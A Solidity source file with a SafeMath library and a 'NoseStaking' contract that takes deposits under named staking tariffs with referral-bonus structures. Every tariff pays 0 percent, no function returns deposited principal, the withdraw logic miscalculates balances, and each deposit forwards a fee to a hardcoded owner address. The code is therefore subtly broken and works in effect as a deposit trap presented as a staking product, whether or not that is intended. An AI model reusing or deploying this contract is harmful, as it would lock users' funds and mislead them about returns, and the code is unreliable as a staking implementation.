// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


struct Tarif {
  uint40 life_days;
  uint256 percent;
}

struct Deposit {
    uint8 coin_index;
  uint40 tarif;
  uint256 amount;
  uint40 time;
}

struct Withdraw {
  uint256 amount;
  uint40 time;
}

struct Coin {
    string name;
    string symbol;
    bool isCoin;
    string chain;
    address addr;
    uint256 staked_value;
    uint8 users;
    string country;
    uint256 fee;
    uint256 divider;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  Withdraw[] withdraws;
  uint256[3] structure;
}

contract NoseStaking {
    using SafeMath for uint;

    address public owner = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;

    bool public tradeOn;
    
    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    
    uint8 constant BONUS_LINES_COUNT = 3;
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 30, 20]; 

    uint constant WITHDRAW_COOLDOWN = 1 days; // claim 1 times per day

    uint256 public minDepositAmount = 0.1 ether;
    uint256 public maxWithdrawAmount = 50 ether;
    uint256 public fee_normal = 100;
    uint256 public fee_percent = 10000;

    uint8 private coins_length;

    uint256 public deposit_fee = 13;

    mapping(uint40 => Tarif) public tarifs;
    mapping(address => Player) public players;
    mapping(uint8 => Coin) public coins;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint40 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event NewWithdraw(address indexed addr, uint256 amount, uint256 date, uint256 last_payout);

    constructor() {
        tradeOn = true;

        coins[0] = Coin("Ethereum", "ETH", true, "EthereumChain", 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0, 0, "USA", 5, 10000);
        coins[1] = Coin("USD token", "USDT", false, "TetherChain", 0x55d398326f99059fF775485246999027B3197955, 0, 0, "USA", 5, 10000);
        coins[2] = Coin("Binance coin", "BNB", true, "BNBChain", 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0, 0, "USA", 5, 10000);
        coins[3] = Coin("CTC token", "CTC(TM)", false, "CyberTronChain", 0xF59Af0c74d3148247339c479bEF4261c3645c73f, 0, 0, "USA", 5, 10000);

        coins_length=4;

        tarifs[1000] = Tarif(1000, 0);
        tarifs[2000] = Tarif(2000, 0);
        tarifs[3000] = Tarif(3000, 0);
        tarifs[4000] = Tarif(4000, 0);
        tarifs[5000] = Tarif(5000, 0);
        tarifs[6000] = Tarif(6000, 0);
    }

    function setTradeOn(bool _tradeStatus) public {
        require(msg.sender == owner, "You must be owner");
        tradeOn = _tradeStatus;
    }

    function transferOwnership(address _owner) public {
        require(msg.sender == owner, "You must be owner");
        owner = _owner;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {

        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    //staking part(first:coin index, second: period, third: staking_amount)
    function deposit(uint8 _index, uint40 _tarif) external payable {
        //fee
        uint256 stake_val;
        uint256 fee;
        uint256 fee_divider;
        uint256 _amount = msg.value;
        (stake_val, fee, fee_divider) = calcFee(_index, _amount);

        require(tradeOn == true, "Project is not launched");
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        // require(_amount >= fee, "You can't deposit less than fee amount");
        require(_amount >= minDepositAmount, "You can't deposit less than Minimum deposit amount");

        Player storage player = players[msg.sender];

        // require(player.deposits.length < 100, "Max 100 deposits per address");

        // _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            coin_index: _index,
            tarif: _tarif,
            amount: _amount,
            time: uint40(block.timestamp)
        }));

        player.total_invested += _amount;
        invested += _amount;

        // _refPayout(msg.sender, msg.value);
        
        // payable(owner).transfer(_amount * deposit_fee / 100);
        payable(owner).transfer(fee/fee_divider);

        emit NewDeposit(msg.sender, _amount/1 ether, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        require(block.timestamp - player.last_payout >= WITHDRAW_COOLDOWN, "You can't withdraw more then 1 times in a day.");

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;

        uint256 withdrawAmount = amount;

        if(amount > maxWithdrawAmount) {
            withdrawAmount = maxWithdrawAmount;
            
            if(player.match_bonus > maxWithdrawAmount) {
                player.match_bonus -= withdrawAmount;
            }
            else {
                player.match_bonus = 0;
                player.dividends -= (maxWithdrawAmount - player.match_bonus);
            }
        }
        else {
            player.dividends = 0;
            player.total_withdrawn = 0;
        }
        
        withdrawn += withdrawAmount;
        
        player.withdraws.push(Withdraw({
            amount: withdrawAmount,
            time: uint40(block.timestamp)
        }));

        payable(msg.sender).transfer(withdrawAmount);
                
        emit NewWithdraw(msg.sender, withdrawAmount, block.timestamp, player.last_payout);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);
            
            if(from < to) {
                value += dep.amount.mul(to - from).mul(tarif.percent).div(100).div(86400).div(tarif.life_days);
            }
        }

        return value;
    }

    function currentTime() view external returns(uint256 timestamp) {
        return block.timestamp;
    }

    function coinsInfo_length() view external returns(uint8) {  
        return coins_length;
    } 

    function memcmp(bytes memory a, bytes memory b) internal pure returns(bool){
        return (a.length == b.length) && (keccak256(a) == keccak256(b));
    }

    function strcmp(string memory a, string memory b) internal pure returns(bool){
        return memcmp(bytes(a), bytes(b));
    }

    function coinsInfoBySymbol(string memory tsymbol) view external returns(string memory name, string memory symbol, string memory chain, bool isCoin, address addr, uint256 staked_value, uint8 users, string memory country, uint256 fee, uint256 divider) {
        uint8 _index=coins_length;
        for (uint8 i=0;i<coins_length;i++) {
            if (strcmp(coins[i].symbol,tsymbol)==true) {
                _index=i;
                break;
            }
        }
        Coin storage coin = coins[_index]; 
        return ( coin.name, coin.symbol, coin.chain, coin.isCoin, coin.addr, coin.staked_value, coin.users, coin.country, coin.fee, coin.divider );
    }

    function coinsInfo(uint8 _index) public view returns(string memory name, string memory symbol, string memory chain, bool isCoin, address addr, uint256 staked_value, uint8 users, string memory country, uint256 fee, uint256 divider) {
        Coin storage coin = coins[_index];
        return (coin.name, coin.symbol, coin.chain, coin.isCoin, coin.addr, coin.staked_value, coin.users, coin.country, coin.fee, coin.divider);
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256 last_payout, uint256 player_match_bonus, Deposit[] memory deposits, Withdraw[] memory withdraws, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            player.last_payout,
            player.match_bonus,
            player.deposits,
            player.withdraws,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

    function calcFee(uint8 _index, uint256 _amount) public view returns(uint256 _staked_val, uint256 fee, uint256 fee_divider) {
        // fee=coins[_index].fee*stake_amount*5/fee_normal;//fee is 0.0000005BNB per staking coin.fee/=10000000 in frontend
        // _staked_val=stake_amount*5;
        fee=coins[_index].fee * _amount;
        _staked_val=_amount*5;
        fee_divider=coins[_index].divider;

        return (_staked_val, fee, fee_divider);
    }
    
    function calcFeeBySymbol(string memory tsymbol, uint256 _amount) view external returns(uint256 _staked_val, uint256 fee, uint256 fee_divider) {
        uint8 _index=coins_length;
        for (uint8 i=0;i<coins_length;i++) {
            if (strcmp(coins[i].symbol,tsymbol)==true) {
                _index=i;
                break;
            }
        }

        ( _staked_val, fee, fee_divider ) = calcFee(_index, _amount);
        return (_staked_val, fee, fee_divider);
    }
}